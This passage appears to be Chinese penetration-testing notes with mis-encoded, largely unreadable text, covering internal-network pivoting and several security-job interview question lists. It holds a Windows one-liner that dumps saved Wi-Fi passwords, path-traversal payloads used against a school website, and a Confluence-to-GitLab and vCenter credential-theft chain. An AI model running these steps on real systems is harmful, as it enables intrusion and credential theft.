for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 
```
![11111](https://user-images.githubusercontent.com/55024146/134108765-85aa58da-1e62-4ca8-9630-f6d92e600727.png)

### å†…ç½‘-DMZåŒºçªç ´
`æœ¬è´¨ï¼šæ‰¾åˆ°èƒ½é€šå‘å†…ç½‘çš„ä¸»æœº`

- åŒç½‘å¡ä¸»æœº
- å†å²ç™»å½•IPï¼šå¯èƒ½æ¥è‡ªå†…ç½‘çš„è¿ç»´
- ç«™åº“åˆ†ç¦»ï¼šæ•°æ®åº“æœåŠ¡å™¨å¾ˆå¯èƒ½åœ¨å†…ç½‘
  - https://github.com/blackarrowsec/mssqlproxy
- VPNï¼šä¿¡æ¯æ”¶é›†
- é’“é±¼ï¼šé’“é±¼ä¸Šçº¿çš„æœºå­å¤§æ¦‚ç‡æ˜¯åœ¨åŠå…¬ç½‘)

### å†…ç½‘-PowerShellå‘½ä»¤å†å²è®°å½•
`â€” ç±»ä¼¼Linuxä¸‹çš„.bash_history`

æ–‡ä»¶ä½ç½®
>  %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

![image](https://user-images.githubusercontent.com/55024146/135838906-ea5e2d1f-5e99-45fc-a841-ca9115c5067c.png)


åˆ©ç”¨æ€è·¯
- æ‰“ç‚¹ï¼š ä»»æ„æ–‡ä»¶ä¸‹è½½+Windowsç³»ç»Ÿï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹è¯¥è·¯å¾„ï¼Œä¹Ÿè®¸æœ‰æ–°ä¸–ç•Œ
- å†…ç½‘ï¼š ä¿¡æ¯æ”¶é›†
- è“é˜Ÿï¼š æº¯æºå–è¯æ—¶ï¼Œæ¯•ç«ŸCMDä¸€ç›´ä»¥æ¥éƒ½è¢«è¯Ÿç—…ï¼ŒPowerShellæ”¹æ”¹é¢œå€¼è¿˜æ˜¯å¾ˆèƒ½æ‰“çš„ï¼Œä½†æ˜¯ä¹Ÿå°±æ‚„æ‚„åœ°ç»™è“é˜Ÿç•™ä¸‹äº†"è¯æ®"(:

![image](https://user-images.githubusercontent.com/55024146/135838819-61bdc4a1-765e-4709-af80-df89dffe5b55.png)

### å†…ç½‘-å®šä½å¤šç½‘å¡ä¸»æœº(OXID Resolver)

å·¥å…·
- https://github.com/Rvn0xsy/OXID-Find/

æ¡ä»¶
- ç›®æ ‡ä¸»æœº: å¼€æ”¾135ç«¯å£

åç»­
- è€ƒè™‘åˆ°å¹³å°å…¼å®¹æ€§ï¼Œå¯ä»¥æ ¹æ®OXID-Findç”¨å…¶ä»–è¯­è¨€é‡æ„ä¸€ç‰ˆè‡ªç”¨ã€‚

### å†…ç½‘-ä¸»æœº"ä¸å‡ºç½‘"
~~æœ¬åœ°ç¯å¢ƒæ­å»ºä¸­~~

### å†…ç½‘-è·¨åŸŸ
~~æœ¬åœ°ç¯å¢ƒæ­å»ºä¸­~~

### æ‰“ç‚¹-Confluence RCEåˆ©ç”¨

è¿‘æœŸçš„1æ¬¡å®æˆ˜

0. Confluence RCE(CVE-2021-26084)ï¼Œå†™å…¥webshellï¼Œè·å–æœåŠ¡å™¨æƒé™
1. æ‰¾åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œè·å–æ•°æ®åº“æƒé™
2. å‰æœŸä¿¡æ¯æ”¶é›†å‘ç°WIKIã€Jiraç­‰ç«™ç‚¹éœ€è¦ADè´¦å·ç™»å½•ï¼ŒçŒœæµ‹å…¶æ•°æ®åº“æœ‰LDAPä¿¡æ¯
3. åœ¨cwd_directory_attributeè¡¨æ‰¾åˆ°LDAPé…ç½®ä¿¡æ¯ï¼Œæ‹¿åˆ°å¯†ç 
4. é€šè¿‡è¯¥å¯†ç è·å–æºç ç®¡ç†å¹³å°(Gitlab)çš„æ§åˆ¶æƒ

### æ‰“ç‚¹-æ–‡ä»¶ä¸‹è½½-.netç¯å¢ƒ

#### 0x01 å‰è¨€

è¿™æ˜¯å¯¹å­¦æ ¡æŸç½‘ç«™éšæœºæµ‹è¯•å‘ç°çš„ï¼Œå½“æ—¶å¯ä¸‹è½½web.configï¼Œç”±äºä¸ç†Ÿæ‚‰.netå°±æ²¡æœ‰åç»­äº†ã€‚

å‰æ®µæ—¶é—´éš”å£ç­çš„å¤§ä½¬æç¤ºè¯´: å¯ä»¥å°è¯•ä¸‹è½½æºç å®¡è®¡ä¸€æ³¢ğŸ‘€

#### 0x02 æµç¨‹å›é¡¾

åœ¨xxé€šçŸ¥é¡µé¢å‘ç°ä¸€å¤„æ–‡ä»¶ä¸‹è½½çš„åŠŸèƒ½ç‚¹
- /tp/DownLoadFile.aspx?filename=

![image](https://user-images.githubusercontent.com/55024146/137951747-c818280c-1fc8-4907-acb6-aaa758197e3d.png)

äºæ˜¯å¼€å§‹çŒœå…¶ç›®å½•
```
?filename=DownLoadFile.aspx
?filename=./DownLoadFile.aspx
?filename=./../DownLoadFile.aspx
......
```
æœ€åä»¥
- ?filename=./../DownLoadFile.aspx

æˆåŠŸä¸‹è½½

![image](https://user-images.githubusercontent.com/55024146/137952301-f2741819-9938-4f84-bff9-f37488f73080.png)

#### 0x03 åˆ©ç”¨æ€è·¯

1.ä¸‹è½½web.configï¼Œè·å–æ•°æ®åº“é…ç½®ä»¥åŠéƒ¨åˆ†ç½‘ç«™æ¶æ„

![image](https://user-images.githubusercontent.com/55024146/137953088-9e11cc43-dfbf-4198-96a3-11f5ddd39bbd.png)

å¦‚å›¾ï¼Œå¯è·å–åˆ°æ•°æ®åº“å¯†ç 

2.éå†ä¸‹è½½*.aspxï¼Œç„¶åæ ¹æ®Inheritsæ‰€å¼•ç”¨æ–‡ä»¶çš„ä½ç½®ï¼Œæ„é€ è·¯å¾„ä¸‹è½½*.dllï¼Œç„¶ådnSpyåç¼–è¯‘åå®¡è®¡å³å¯

ç¤ºä¾‹ï¼šæ–‡ä»¶ä¸‹è½½æ¼æ´

![image](https://user-images.githubusercontent.com/55024146/137953243-159c1f8a-87be-499b-9498-37f6d5acf409.png)


### ç§‹æ‹›-ä»å®‰æœ->å®‰ç ”(é¢ç»)
å†™åœ¨å‰é¢ï¼š
> ä¸¤å¹´äº†ï¼Œè™½èœä½†å­¦ğŸ™ˆã€‚  
> ç”±äºä¸ªäººæˆé•¿å’Œå‘å±•çš„åŸå› ï¼Œæ ¡æ‹›é€‰æ‹©äº†æŸå®¶å®éªŒç®—æ˜¯ä»å¤´å¼€å§‹æJavaå®‰å…¨ã€‚ç„¶ååŠ ä¸Šå·¥ä½œå†…å®¹çš„å˜åŒ–ï¼Œæ¥è¿™è¾¹åå°±ä¸æ€ä¹ˆåšæ¸—é€äº†ï¼Œæ‰€ä»¥æ‰“ç®—æš‚æ—¶åœæ›´è¿™ä¸ªæ¸—é€ç³»åˆ—äº†ï¼
> ä¸Šå‘¨æœ«æ•´ç†ç¬”è®°æ—¶å‘ç°äº†æœ‰åšè®°å½•çš„å‡ æ¬¡é¢è¯•(ä¸å«ç°åœ¨çš„ä¸œå®¶)ï¼Œæƒ³ç€ä¹Ÿä¸€å¹¶è´´ä¸Šä¾›æœ‰éœ€è¦çš„äººå‚è€ƒå­¦ä¹ ï¼Œä¹Ÿç®—æ˜¯è®°å½•ä¸€ä¸‹è‡ªå·±ä»20å¹´7æœˆçš„ç¬¬1ä»½é©»åœºå®ä¹ offeråˆ°ç°åœ¨(21å¹´10æœˆ)çš„ç§‹æ‹›offerè¿™ä¸€è·¯çš„ğŸ‘£å§ï¼


è¯•é¢˜æ¥æºï¼š
- å®ä¹  + ç§‹æ‹›
> æœ‰äº›è¯•é¢˜æ˜¯åé¢é å›å¿†è¡¥å……çš„ï¼Œæˆ–æœ‰åå·® :)
#### æ—¶é—´çº¿
##### (2020å®ä¹ )-å®‰å…¨æœåŠ¡å·¥ç¨‹å¸ˆ(é©»åœº)

é¢è¯•éš¾åº¦

- ğŸ´


é¢è¯•è¯•é¢˜

```
# 2020å¹´æš‘æœŸå®ä¹ 
1.æŒ–è¿‡çš„ä¸€äº›æ¼æ´ï¼ˆä¸¾ä¾‹è¯´æ˜ï¼‰
2.æ¸—é€æµ‹è¯•çš„æ€è·¯ï¼ˆç»“åˆè‡ªå·±çš„ç»éªŒï¼‰
3.å®‰å…¨å·¥å…·çš„ä½¿ç”¨ï¼ˆxray,sqlmap,awvsç­‰ï¼‰
4.owasp top 10
- è®°ä½æ˜¯å“ª10ä¸ª
- çŸ¥é“æ¼æ´åŸç†
- çŸ¥é“é˜²å¾¡å§¿åŠ¿
5.owasp top 10ä¸­è‡ªå·±ç†Ÿæ‚‰/ç»å¸¸æŒ–åˆ°çš„æ¼æ´
6.sqlæ³¨å…¥
- æ¼æ´å‡ ç§ç±»å‹
- æ¼æ´æˆå› 
- é˜²å¾¡æ–¹æ³•
7.ç¼–ç¨‹èƒ½åŠ›(å†™ä¸€äº›å°è„šæœ¬ï¼Œæ”¹ä¸€äº›pocç­‰)
```
##### (2020å®ä¹ )-å®‰å…¨ç ”ç©¶/æŠ€æœ¯æ”¯æŒ(åæ”»é˜²)

é¢è¯•éš¾åº¦

- ğŸ´ğŸ´ğŸ´


é¢è¯•è¯•é¢˜

```
# 2020å¹´æš‘æœŸå®ä¹ 
0.è‡ªæˆ‘ä»‹ç»
1.å®ä¹ ç»å†
2.hwç»å†
3.å¯¹çº¢è“å¯¹æŠ—çš„çœ‹æ³•
4.å‘å±•æ–¹å‘å’Œè§„åˆ’
5.æŒ–è¿‡å“ªäº›æ´?è¿½é—®åŸç†
6.æŒ–è¿‡æœ€æœ‰æ„æ€/æœ€éš¾çš„ä¸€ä¸ªæ´
7.sqlæ³¨å…¥å†™shell
8.å†…ç½‘æ¸—é€
9.åŸŸæ¸—é€
10.Javaååºåˆ—åŒ–åŸºç¡€
11.è·Ÿè¿‡å“ªäº›ndayï¼Œæ€æ ·ä¸€ä¸ªæ€è·¯
12.shiroååºåˆ—åŒ–
13.æ€æ ·å¯¹ä¸€ä¸ªç«™å»æŒ–nday
14.æŒ–åˆ°è¿‡0dayå—
15.ä»£ç å®¡è®¡
16.å®æˆ˜æœ‰æ²¡æœ‰é‡åˆ°xxeï¼Œoracleæ³¨å…¥ï¼Œmssqlæ³¨å…¥ï¼Œssrfï¼Œcsrf
17.ä¸€äº›é€»è¾‘æ¼æ´
18.appæ¸—é€ç»å†
19.ä¼šä¸ä¼šäºŒè¿›åˆ¶/é€†å‘
...

# å°ç»“

åªè®°å¾—å½“æ—¶æŠ€æœ¯é¢ç»“æŸåï¼Œé¢è¯•å®˜å’Œæˆ‘è¯´: ä½ åé¢è¿˜æœ‰å¾ˆå¤šåŸºç¡€éœ€è¦è¡¥å•Šï¼ğŸ™ˆ
```

##### (2021ç¤¾æ‹›)-çº¢é˜Ÿæ”»é˜²å·¥ç¨‹å¸ˆ
é¢è¯•éš¾åº¦

- ğŸ´ğŸ´ğŸ´ğŸ´

é¢è¯•è¯•é¢˜

```
sqlæ³¨å…¥çš„æŠ¥é”™å‡½æ•°
dom å‹ xss
ssrf åˆ©ç”¨ç‚¹
sqlæ³¨å…¥ç‚¹ï¼Œç©ºè¡¨å¦‚ä½•åˆ©ç”¨
mvcä»£ç å®¡è®¡æµç¨‹
çœ‹ä½ ç®€å†æœ‰åœ¨æŒ–æ´ï¼Œè¯´ä¸€ä¸‹ä½ æŒ–è¿‡çš„æ´
Redis åˆ©ç”¨å§¿åŠ¿åŠç¯å¢ƒå·®å¼‚
fastjsonå›æ˜¾
jndiæ³¨å…¥åŠåŸç†
ç«¯å£ 389
Java å›æ˜¾
æ³›å¾®oa xstreamçš„å›æ˜¾(jdk1.8å’Œ1.7çš„å·®å¼‚)
shiro é™åˆ¶payloadé•¿åº¦
Javaå›æ˜¾çš„é€šç”¨æ€è·¯ä»¥åŠä¸åŒç‰ˆæœ¬jdkçš„å·®å¼‚
æ–‡ä»¶ä¸Šä¼ ç™½åå•åˆ©ç”¨
00æˆªæ–­çš„åŸç†
åˆ¤æ–­åŸŸæ§çš„å‡ ç§æ–¹å¼
å·¥ä½œç»„æ¨ªå‘
åŸŸå†…æ¨ªå‘
Windowsè®¤è¯åè®®
ç™½é“¶ç¥¨æ®é»„é‡‘ç¥¨æ®
åˆ¤æ–­æ˜¯å¦åœ¨åŸŸå†…
hashä¼ é€’åŸç†
æƒé™ç»´æŒ
æ¨ªå‘ç§»åŠ¨çš„å„ç§å§¿åŠ¿åŠåŸç†
å‡­è¯è·å–(å§¿åŠ¿/å¸¸ç”¨/åŸç†/å¯¹æŠ—)
å¦‚ä½•å¯¹æŠ—æ€è½¯åŠ åé—¨ç”¨æˆ·
Chrome dumpå¯†ç çš„åŸç†ï¼Œå¦‚æœè®©ä½ å†™ä¸ªå·¥å…·ï¼Œæ€è·¯æ˜¯ä»€ä¹ˆ(æˆ–è€…åˆ«äººå·¥å…·çš„å®ç°åŸç†)
```

##### (2021å®ä¹ )-æŸå®éªŒå®¤å®‰å…¨ç ”ç©¶å‘˜ 

> from towns_

é¢è¯•éš¾åº¦

- ğŸ´ğŸ´ğŸ´

é¢è¯•è¯•é¢˜

```
# ä¸»è¦æ˜¯ä¸¤å¤§å—ï¼šJavaååºåˆ—åŒ–å’Œå†…ç½‘
Javaååºåˆ—åŒ–
1.æœ‰å“ªäº›CCé“¾æ˜¯æœ‰å›æ˜¾çš„
2.Javaååºè¿åŒ–ç›¸å…³çš„åè®®
3.ç†Ÿæ‚‰çš„Javaçš„æ¼æ´ï¼Œé€‰ä¸€ä¸ªæ¥æ·±å…¥é—®ï¼Œshiorç³»åˆ—ï¼Œ550ï¼Œ721åŸç†ï¼Œkeyå¯¹äº†æ— æ³•ååºåˆ—åŒ–ï¼Œä¸æ˜¯æ— é“¾çš„åŸå› 
  - serialVersionUID

å†…ç½‘
1.æœ‰ä¸€å°Windowsæœºå™¨ä½ ä¼šåšäº›ä»€ä¹ˆ
2.æœ‰æ˜æ–‡å¯†ç ï¼Œå¯†æ–‡å¯†ç ä½ ä¼šåšäº›å•¥ã€‚
3.æœ‰ä¸ªåŸºäºwebshellçš„ï¼Œä½†TCPä¸å‡ºç½‘ï¼Œä¸ä¼šæ€ä¹ˆåšã€‚
4.PTH
5.DCsyncåŸç†ï¼ŒDCsyncæ˜¯é‚£ä¸ªåè®®
6.æœ‰å°WindowsåŸŸå†…æœºå­ï¼Œä½ æ€ä¹ˆæ‰“åŸŸæ§
```

##### (2021å®ä¹ /æ ¡æ‹›)-æ”»é˜²ç ”ç©¶å‘˜(ååº”ç”¨)

é¢è¯•éš¾åº¦

- ğŸ´ğŸ´


é¢è¯•è¯•é¢˜

```
# åŸºç¡€
1. httpçŠ¶æ€ç ï¼Œ502ï¼Œ503ï¼Œ501
2. httpè¯·æ±‚æ–¹å¼åŠå„è‡ªä½œç”¨
3. è®¡ç®—æœºç½‘ç»œçš„åˆ†å±‚åŠåˆ†åˆ«æœ‰å“ªäº›åè®®

# owasp top 10
1. xsså¦‚ä½•æ‰§è¡Œä»£ç 
2. xsså¸¸ç”¨å“ªäº›æ ‡ç­¾
3. http only
4. æ€æ ·åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥
5. sqlæ³¨å…¥æ— å›æ˜¾æ€ä¹ˆåŠ
6. å»¶æ—¶æ³¨å…¥é™¤äº†sleepçš„å…¶ä»–å§¿åŠ¿(mysql)
7. dnslogçš„å®ç°åŸç†
8. sqlæ³¨å…¥ï¼Œå•å¼•å·è¢«æ‹¦æˆªï¼Œå¦‚ä½•ç»•è¿‡
9. sqlæ³¨å…¥ï¼Œå†™shellçš„è¯­å¥ï¼Œé™¤äº†into outfileè¿˜æœ‰ä»€ä¹ˆmysqlçš„ç‰¹æ€§å¯ä»¥getshell
10.redisçš„åˆ©ç”¨ï¼Œå¦‚ä½•shell,ç›¸å…³å‘½ä»¤
11.ssrfçš„åŸç†å³ååˆ©ç”¨ï¼Œæ€ä¹ˆæ‰§è¡Œå‘½ä»¤ï¼Œå¸¸æ­é…ä½¿ç”¨çš„åè®®

# PHPå®‰å…¨ç›¸å…³
1. å®¡è®¡æµç¨‹
2. å‘½ä»¤æ‰§è¡Œå‡½æ•°
3. æ–‡ä»¶ä¸Šä¼ å‡½æ•°
4. ä»£ç æ‰§è¡Œå‡½æ•°
5. venderç›®å½•
6. phpunit
7. phpå¯ä»¥æ„é€ æ— æ–‡ä»¶shellå—

# Javaå®‰å…¨ç›¸å…³
1. æŒ–è¿‡çš„é€šç”¨æ´ï¼Œä½ ä¼šæ€ä¹ˆåˆ©ç”¨(ç»„åˆ)
2. å‘½ä»¤çš„å‡½æ•°æˆ–åŒ…
3. javaå“ªäº›æ¡†æ¶ï¼Œå®¡è¿‡å“ªäº›æ¡†æ¶ï¼Œå®ƒä»¬å¸¸å‡ºç°çš„é—®é¢˜æ˜¯ä»€ä¹ˆ
4. å®¡è®¡æµç¨‹ï¼Œä½ ä¸€èˆ¬å…³æ³¨å“ªäº›æ´ï¼Œæˆ–æ“…é•¿æŒ–å“ªç§ç±»å‹
5. tomcatåšå›æ˜¾
6. å†…å­˜é©¬çš„å®ç°

# å…¶ä»–
- å†™poc/expçš„ç»å†å’Œå¿ƒå¾—
- å¤ç°çš„ä¸€äº›æ¼æ´
- Linux ææƒçš„å§¿åŠ¿
- Linuxä¸‹æœ‰å“ªäº›æ–‡ä»¶è¿›è¡Œæ¸—é€æ—¶æ¯”è¾ƒå…³æ³¨çš„ï¼ŒåŠæ–‡ä»¶æƒé™é—®é¢˜
- dirty cow çš„æ—¶é—´åŠå…¶ä¿®å¤ç‰ˆæœ¬(å“ªå¹´åå°±æ²¡æ³•ç”¨äº†)
- ä½ è§‰å¾—ä»€ä¹ˆæ˜¯ä½ è‡ªå·±æ¯”è¾ƒæ“…é•¿çš„è€Œæˆ‘æ²¡æœ‰é—®åˆ°çš„

# å°ç»“
è¿™ä¸ªå²—ä½ä¸»è¦æ˜¯ææ¼æ´æŒ–æ˜å’Œåˆ©ç”¨ä»¥åŠåŸç†åˆ†æï¼ŒWebæ–¹é¢å°±æ˜¯JAVAå’ŒPHPçš„å®‰å…¨ç ”ç©¶ï¼Œæ¯”å¦‚JAVAä¸‹çš„æµè¡Œæ¡†æ¶ï¼Œç»„ä»¶å’ŒæœåŠ¡å™¨åº”ç”¨çš„å®‰å…¨é—®é¢˜ã€‚
æ²¡æœ‰é—®å†…ç½‘!!!
```

##### (2021ç§‹æ‹›)-æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆ

é¢è¯•éš¾åº¦

- ğŸ´ğŸ´


é¢è¯•è¯•é¢˜

```
1.è‡ªæˆ‘ä»‹ç»
2.å°è±¡æ·±åˆ»çš„ä¸€æ¬¡æ¸—é€
3.æ¸—é€æµ‹è¯•çš„æµç¨‹
4.SQLæ³¨å…¥åŸç†ï¼ŒåŠå¸¸ç”¨payload(æ‰‹å†™-çˆ†è¡¨å)
5.SQLæ³¨å…¥ç©ºæ ¼ä¸èƒ½ä½¿ç”¨å¦‚ä½•ç»•è¿‡
6.SQLæ³¨å…¥é˜²å¾¡ï¼Œå»¶ç”³é¢„å¤„ç†ä¸èƒ½é¢„é˜²å“ªäº›æ³¨å…¥
7.åŒæºç­–ç•¥
8.a.baidu.comå’Œb.baidu.comæ˜¯å¦åŒæº
9.SSRFåŸç†ï¼Œåˆ©ç”¨
10.æ”»å‡»redisçš„æ–¹å¼ï¼ˆæ‰‹å†™payloadï¼‰
11.CSRFçš„åŸç†åŠé˜²å¾¡
12.ä¸€ç§ç‰¹æ®Šçš„CSRFåœºæ™¯ï¼šåç«¯åªè§£æjsonæ ¼å¼çš„æ—¶å€™å¦‚ä½•åˆ©ç”¨CSRF(éæ›´æ”¹Content-Type)
13.SameSite
14.DNS Rebinding
15.Fastjsonååºåˆ—åŒ–åŠå¦‚ä½•ä¿®å¤
16.å­åŸŸåæšä¸¾ç”¨è¿‡é‚£äº›å·¥å…·ï¼ŒåŸç†æ˜¯ä»€ä¹ˆï¼Œå¦‚æœå‡ºç°äº†ä»»æ„å­åŸŸåéƒ½è¿”å›200æ˜¯ä»€ä¹ˆåŸå› ï¼Ÿ
17.Javaå­¦åˆ°å“ªç§ç¨‹åº¦äº†ï¼Ÿ

```
##### (2021æ ¡æ‹›)-å®‰å…¨ç ”ç©¶å‘˜(SASTæ–¹å‘)
é¢è¯•éš¾åº¦

- ğŸ´ğŸ´

é¢è¯•è¯•é¢˜
```
## ä¸€é¢
# é—®é¢˜
1. è‡ªæˆ‘ä»‹ç»
2. æ ¹æ®ç®€å†é—®(ä¸»è¦æ˜¯æŒ–æ´æ–¹é¢)
3. å¯¹SASTçš„ç†è§£
4. å¯¹IASTçš„ç†è§£
5. æ±¡ç‚¹åˆ†æ
6. å¯¹DevSecOpsçš„ç†è§£
7. å¯¹SDLçš„ç†è§£
8. åé¢çš„å‘å±•è§„åˆ’(å­¦ä¹ æ–¹å‘)
9. ç›®å‰æŒæ¡çš„è¯­è¨€æ ˆæ€ä¹ˆæ ·ï¼Ÿæ„¿æ„å»å­¦ä¹ æ–°çš„è¯­è¨€å—ï¼Ÿ
10. å¯¹SASTå’ŒIASTä¸­å“ªä¸ªæ›´æ„Ÿå…´è¶£
11. è®²è®²ç™½ç›’å®¡è®¡çš„æ€è·¯
12. æœ‰å†™è¿‡ç›¸å…³çš„è‡ªåŠ¨æŒ–æ˜å·¥å…·å—

# å°ç»“
ä½“éªŒå¾ˆå¥½ï¼Œæ„Ÿè§‰åŒæ–¹æ›´åƒæ˜¯åœ¨æ¢è®¨ã€‚

## äºŒé¢
# é—®é¢˜
1. Javaååºåˆ—åŒ–
2. äº†è§£å“ªäº›ç™½ç›’å®¡è®¡çš„å·¥å…·ï¼ŒçŸ¥é“åŸç†å—
3. åŸŸæ§çš„æ”»å‡»æ–¹å¼
4. MS14-068çš„åŸç†
5. é»„é‡‘å’Œç™½é“¶ç¥¨æ®çš„åˆ©ç”¨åŠå…¶æ•ˆæœï¼ŒåŸç†å±‚é¢
6. IAST
7. æ±¡ç‚¹è·Ÿè¸ª
8. å€™é€‰äººçš„è¯­è¨€æ ˆï¼šjavaå’Œgo

# å°ç»“ 
ä¼°è®¡å‡‰å‡‰ï¼Œè¯´è®©æˆ‘å»æå‰å®ä¹ ï¼Œæˆ‘è¯´æƒ³æ‹¿æ­£å¼Offer
```

##### (2021æ ¡æ‹›)-é«˜çº§å®‰å…¨å·¥ç¨‹å¸ˆ(ä»£ç å®¡è®¡/å®‰å…¨è¯„ä¼°)

é¢è¯•éš¾åº¦

- ğŸ´ğŸ´ğŸ´

é¢è¯•è¯•é¢˜
```
## æ¸—é€åŸºç¡€
0.è‡ªæˆ‘ä»‹ç»
1. SQLæ³¨å…¥ å†™ Shell
   mysql & mssql & oracle
2. ç™»å½•æ¡†æ”»å‡»é¢
3. getshellçš„å§¿åŠ¿
4. æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œé»‘åå•é™åˆ¶ï¼Œå¦‚ä½•åˆ©ç”¨
5. SQLæ³¨å…¥ååˆ©ç”¨
6. è®²ä¸€ä¸ªä½ è§‰å¾—æœ‰è¶£çš„æ¼æ´æ¡ˆä¾‹
7. å‰æ®µæ—¶é—´è“å‡ŒOAçš„æ´
8. DNS é‡ç»‘å®šï¼Œåˆ©ç”¨
9. Phpå’ŒJavaçš„æ–‡ä»¶åŒ…å«åŒºåˆ«
10. Redisçš„åˆ©ç”¨

## PHP
1. å¸¸è§æ¼æ´å¯¹åº”å‡½æ•°ï¼ˆæŒ¨ä¸ªé—®ï¼‰
- å‘½ä»¤æ‰§è¡Œ
- ä»£ç æ‰§è¡Œ
- æ–‡ä»¶åŒ…å«
- æ–‡ä»¶ä¸Šä¼ 
- æ–‡ä»¶åˆ é™¤
- SSRF
- ...
2. PHPå®‰å…¨ç‰¹æ€§æœ‰å…³æ³¨å—
3. ä»£ç å®¡è®¡(mvc/émvc)

## Java
1. Javaæ‰§è¡Œå‘½ä»¤çš„å‡ ç§æ–¹å¼
2. Javaååºåˆ—åŒ–çš„åŸç†
3. è®²è®²ysoçš„é“¾
4. Shiro ååºåˆ—åŒ–åŸç†
5. åå°„ï¼Œä»£ç†ï¼Œç±»åŠ è½½è¿™äº›ç†Ÿæ‚‰å—
6. ä»£ç å®¡è®¡

## Python
1. æ˜¯å¦å†™è¿‡éè„šæœ¬çš„å·¥å…·
2. Webæ¡†æ¶(flask/django)
3. ä»£ç å®¡è®¡

## æ¼æ´æŒ–æ˜(é‡ç‚¹å…³æ³¨)
1. ç®€å†ä¸Šçš„é€šç”¨æ´æŒ¨ä¸ªé—®
2. æ¼æ´åˆ©ç”¨ç ”ç©¶çš„ç†è§£
3. æ¼æ´åˆ©ç”¨ç ”ç©¶çš„æ¡ˆä¾‹

## å†…ç½‘(åå®æˆ˜é—®é¢˜)
1. disable function bypass
2. webshell ææƒ(ä½æƒé™ -> é«˜æƒé™)
3. å·²ç»æ‹¿åˆ°webshell,è¯´è¯´ä½ çš„å†…ç½‘æ€è·¯
4. ä¸å…è®¸æ‰«æï¼Œå¦‚ä½•æ¨ªå‘
5. å­˜åœ¨æ€è½¯ï¼Œä¸å…è®¸exeè½åœ°ï¼Œæ€ä¹ˆåŠ
6. å¸¸ç”¨çš„ææƒå§¿åŠ¿
7. å†…ç½‘ä»£ç†ï¼Œè¯¦ç»†é—®äº†frp
```
### å†…ç½‘-vSphere & vCenterçš„ååˆ©ç”¨å§¿åŠ¿
â€” å†å²ç¬”è®°æ•´ç†

> å…³äºvcenterçš„åˆ©ç”¨ä¸»è¦æ˜¯åœ¨å·²ç»è·å–æœåŠ¡å™¨æƒé™çš„æƒ…å†µä¸‹

ï¼ˆç™»å½•åå°ï¼‰

- ä» vCenter å¤‡ä»½ä¸­æå– IdP è¯ä¹¦å¹¶ä¼ªé€ ç®¡ç†å‘˜èº«ä»½ç™»å½•åå°ï¼ˆå®æˆ˜æ¡ˆä¾‹ï¼‰
- å·¥å…·åœ°å€
    - [vcenter_saml_login](https://github.com/horizon3ai/vcenter_saml_login)

data.mdbä½ç½®ï¼š

- Linux:
    
    ```
    /storage/db/vmware-vmdir/data.mdb
    ```
    
- Windows
    
    ```
    C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
    ```
    

å®æµ‹æ•ˆæœ

![image](https://user-images.githubusercontent.com/55024146/144646720-bc6bb84a-def4-41e6-8ccc-8aedd89165b8.png)

è¿›å…¥åå°å
  - å¯é€šè¿‡vcenterçš„å¿«ç…§åŠŸèƒ½è·å–è™šæ‹Ÿæœºçš„å¿«ç…§ï¼Œç„¶åé€šè¿‡å†…å­˜å–è¯çš„å§¿åŠ¿dumpå‡­è¯ï¼Œpthï¼›
  - ä¹Ÿå¯ä¼ åˆ°æœ¬åœ°ï¼Œå†æ¢å¤æˆè™šæ‹Ÿæœºï¼Œç„¶åé€šè¿‡PEï¼Œé‡å‘½åCMD.EXEä¸ºOSK.exeè¦†ç›–åŸOSK.exeï¼Œæ­¤æ—¶å¼€æœºæ‰“å¼€å±å¹•é”®ç›˜ä¼šå¼¹å‡ºSYSTEMæƒé™çš„å‘½ä»¤è¡Œçª—å£ï¼Œæœ¬åœ°ä¸Šçº¿csç„¶åhashdumpæŠ“å–å‡­è¯ï¼Œpthå³å¯ã€‚ï¼ˆby banliz1ï¼‰
